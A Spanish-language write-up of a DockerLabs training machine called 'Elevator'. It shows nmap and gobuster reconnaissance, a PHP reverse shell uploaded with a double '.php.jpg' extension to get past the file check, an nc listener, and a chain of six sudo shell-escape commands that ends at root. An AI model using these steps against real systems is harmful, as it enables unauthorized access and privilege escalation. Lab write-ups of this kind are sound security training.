# Informe de Pentesting – Máquina Vulnerable *Elevator*

![Logo](/Elevator/Imagenes/Logo.png)

## Descripción

La máquina vulnerable *Elevator* fue descargada desde la página oficial de DockerLabs. Una vez descargado el archivo `elevator.zip`, se descomprime utilizando la herramienta `unzip`:

```bash
unzip elevator.zip
```

Posteriormente, se despliega la máquina con el script de instalación automática:

```bash
sudo bash auto_deploy.sh elevator.tar
```

## Objetivo

Obtener acceso inicial a la máquina e ir escalando privilegios hasta llegar a `root`.

---

## 1. Comprobación de Conectividad

Se verifica que la máquina esté activa usando un ping:

```bash
ping -c4 172.17.0.2
```

![Ping](/Elevator/Imagenes/Ping.jpeg)

---

## 2. Reconocimiento

### 2.1 Escaneo de Puertos

Se realiza un escaneo agresivo de todos los puertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Resultado: solo el puerto **80 (HTTP)** está abierto.

![Puertos](/Elevator/Imagenes/Puertos.jpeg)

### 2.2 Extracción de Puertos

Se utiliza el script personalizado `extractPorts` para filtrar los puertos encontrados.

![Servicios](/Elevator/Imagenes/Servicios.jpeg)

---

## 3. Análisis de la Aplicación Web

Al acceder al sitio web en el puerto 80, no se detecta contenido destacable.

![Página Principal](/Elevator/Imagenes/Pagina.jpeg)

### 3.1 Fuzzing de Directorios

Se realiza un ataque de fuerza bruta para descubrir directorios ocultos:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

Se descubren dos directorios interesantes. Se realiza fuzzing sobre `/themes/`:

```bash
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt
```

![Fuzzing](/Elevator/Imagenes/Fuzzing.jpeg)

---

## 4. Explotación

### 4.1 Descubrimiento de Funcionalidad Vulnerable

En `http://172.17.0.2/themes/archivo.html` se encuentra una funcionalidad para subir imágenes (`.jpg` únicamente).

![Subida](/Elevator/Imagenes/Subir.jpeg)

Además, se descubren las rutas:

* `http://172.17.0.2/themes/uploads/`
* `http://172.17.0.2/themes/upload.php`

![Directorio Uploads](/Elevator/Imagenes/Directorio.jpeg)

### 4.2 Payload Malicioso

Se prepara una reverse shell PHP con doble extensión (`.php.jpg`):

```php
nano php_reverseshell.php.jpg
```

![Reverse Shell GitHub](/Elevator/Imagenes/Gitrevershell.jpeg)
![Tricks](/Elevator/Imagenes/tricks.jpeg)

El archivo se sube exitosamente, y se puede ejecutar desde la carpeta `/themes/uploads/`.

![Archivo Subido](/Elevator/Imagenes/Archivo.jpeg)
![Subida Exitosa](/Elevator/Imagenes/Subida.jpeg)
![Carga Exitosa](/Elevator/Imagenes/Carga.jpeg)

### 4.3 Acceso Remoto

Se escucha en el puerto definido en el payload (443):

```bash
sudo nc -lvnp 443
```

![Escucha](/Elevator/Imagenes/Escucha.jpeg)

Se accede exitosamente como `www-data`.

---

## 5. Escalada de Privilegios

Se aprovechan múltiples permisos `sudo` entre usuarios, realizando un encadenamiento de escaladas:

1. `www-data` puede ejecutar `/usr/bin/env` como `daphne`
2. `daphne` puede usar `/usr/bin/ash` como `vilma`
3. `vilma` puede usar `ruby` como `shaggy`
4. `shaggy` puede usar `lua` como `fred`
5. `fred` puede usar `gcc` como `scooby`
6. `scooby` puede usar `sudo` como `root`

```bash
sudo -u daphne /usr/bin/env /bin/bash
sudo -u vilma /usr/bin/ash
sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
sudo -u scooby /usr/bin/gcc -wrapper /bin/bash,-s .
sudo -u root /usr/bin/sudo su
```

![Intrusión](/Elevator/Imagenes/Intrusion.jpeg)
![Escalada](/Elevator/Imagenes/Escalada.jpeg)

---

## Conclusión

La máquina *Elevator* presenta una cadena de configuraciones inseguras en múltiples usuarios que permiten una escalada de privilegios completa hasta `root`. El punto inicial de explotación es una mala validación de archivos subidos, que permite ejecución remota de código.

